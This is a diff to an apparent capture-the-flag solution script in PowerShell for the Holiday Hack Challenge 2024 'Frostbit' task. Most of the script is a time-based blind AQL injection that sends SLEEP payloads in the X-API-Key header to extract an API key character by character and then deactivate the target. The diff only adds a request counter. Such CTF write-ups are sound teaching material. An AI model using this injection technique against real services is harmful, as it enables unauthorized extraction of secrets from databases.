@@ -2,7 +2,7 @@
     .SYNOPSIS
 
         Holiday Hack Challenge 2024 - Snow-maggedon
-        
+
         Deactivate Frostbit Naughty-Nice List Publication
         Difficulty: 5 of 5
 
@@ -32,7 +32,7 @@
         FALSE response time  137 ms : X-API-Key: ' OR  "_ke" IN ATTRIBUTES(doc) ? SLEEP(2) : '
         TRUE  response time 2120 ms : X-API-Key: ' OR  "_id" IN ATTRIBUTES(doc) ? SLEEP(2) : '
         FALSE response time  267 ms : X-API-Key: ' OR   "_i" IN ATTRIBUTES(doc) ? SLEEP(2) : '
-        
+
         Based on the AQL error from the api, these expand out to:
         FOR doc IN config
             FILTER doc.<key_name_omitted> == '' OR "_key" IN ATTRIBUTES(doc) ? SLEEP(2) : ''
@@ -45,7 +45,7 @@
         Required Bot UUID, this is unique to each player and set of generated artifacts.
         You can find this UUID in both the frostbit_core_dump file strings as well as the
         pcap file provided you have decrypted the TLS HTTP traffic stream.
-        
+
         The BotUUID will have this format of hex chars and dashes (example only):
         f14d60cd-67b9-44ec-8f41-b5ea5137413c
 
@@ -58,7 +58,7 @@
         supply this parameter at all.
 
     .PARAMETER Deactivate
-        
+
         Optional Use the found X-API-Key to automatically deactivate the Frostbit ransomware data publication.
 
     .EXAMPLE
@@ -69,7 +69,7 @@
 
         .\15-frostbit-deactivate-gold.ps1 -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c -Deactivate
 
-        
+
     .EXAMPLE
 
         .\15-frostbit-deactivate-gold.ps1 -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c -SQLSleepTimeSeconds 1.5
@@ -96,7 +96,7 @@ function Is-UUID {
     param (
         [string]$InputString
     )
-    
+
     $uuidRegex = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$'
     return $InputString -match $uuidRegex
 }
@@ -105,7 +105,7 @@ function Is-UUID {
 # Create array of chars a..z, 0..9, -, _ for later data inference ops.
 # Explicity cast each array object to a string since powershell will create a mixed-object array.
 #
-$letters = @('a'..'z') + ('0'..'9') + '-' + '_'
+$letters = @('0'..'9') + ('a'..'z') + '-' + '_'
 $letters = $letters | ForEach-Object { [string]$_ }
 
 # Set our default SLEEP() operation sleep time in seconds.
@@ -143,6 +143,7 @@ $sleeperrormargin = $sleepytimems * 0.98
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $session.UserAgent = "Mozilla/5.0"
 
+$totalops = 0
 $len = 0
 
 "Starting Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
@@ -153,19 +154,21 @@ if(Test-Path -Path key-candidates.txt){
     "`nTrying brute force search for attribute names in doc : "
     $list = Get-Content -Path key-candidates.txt
     foreach($key in $list) {
-        
+
         $apikey = "`' OR `"$key`" IN ATTRIBUTES(doc) ? SLEEP($sleepytime) : `'"
-    
+
         $sw = [Diagnostics.Stopwatch]::StartNew()
-    
+
         $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
         -WebSession $session `
         -SkipHttpErrorCheck `
         -Headers @{
         "X-API-Key"="$apikey"
         }).Content | ConvertFrom-Json
-    
+
         $sw.Stop()
+        $totalops++
+
         if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
             "Found: " + $key
         }
@@ -189,7 +192,7 @@ if(Test-Path -Path key-candidates.txt){
     }).Content | ConvertFrom-Json
 
     $sw.Stop()
-
+    $totalops++
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
         "Found: " + $_
     }
@@ -209,7 +212,7 @@ if(Test-Path -Path key-candidates.txt){
     }).Content | ConvertFrom-Json
 
     $sw.Stop()
-
+    $totalops++
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
         "Found: " + $_
     }
@@ -230,7 +233,7 @@ if(Test-Path -Path key-candidates.txt){
     }).Content | ConvertFrom-Json
 
     $sw.Stop()
-    
+    $totalops++
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
         "Found: " + $_
         $len = $_ - 1
@@ -243,18 +246,18 @@ $name = ""
 foreach($pos in 0..$len){
     foreach($letter in $letters){
         $apikey = "`' OR SUBSTRING(ATTRIBUTES(doc, true)[0], $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"
-    
+
         $sw = [Diagnostics.Stopwatch]::StartNew()
-    
+
         $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
         -WebSession $session `
         -SkipHttpErrorCheck `
         -Headers @{
         "X-API-Key"="$apikey"
         }).Content | ConvertFrom-Json
-    
+
         $sw.Stop()
-    
+        $totalops++
         if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
             $name += $letter
             break
@@ -278,7 +281,7 @@ foreach($pos in 0..$len){
     }).Content | ConvertFrom-Json
 
     $sw.Stop()
-
+    $totalops++
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
         "Found: " + $_
         $len = $_ - 1
@@ -290,18 +293,18 @@ $value = ""
 foreach($pos in 0..$len){
     foreach($letter in $letters){
         $apikey = "`' OR SUBSTRING(doc.$name, $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"
-    
+
         $sw = [Diagnostics.Stopwatch]::StartNew()
-    
+
         $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
         -WebSession $session `
         -SkipHttpErrorCheck `
         -Headers @{
         "X-API-Key"="$apikey"
         }).Content | ConvertFrom-Json
-    
+
         $sw.Stop()
-    
+        $totalops++
         if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
             $value += $letter
             break
@@ -322,6 +325,7 @@ if($Deactivate){
     "X-API-Key"="$apikey"
     })
     ($resp.Content | ConvertFrom-Json).message
+    $totalops++
 }
 else{
     "Add the '-Deactivate' switch to automatically deactivate the publication of the naughty_nice_list.csv file"
@@ -329,4 +333,4 @@ else{
 $swtotal.Stop()
 "`nCompleted Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
 "Deactivation Attack took $($swtotal.Elapsed.Minutes) minutes, $($swtotal.Elapsed.Seconds) seconds."
-
+"Total request operations: " + $totalops
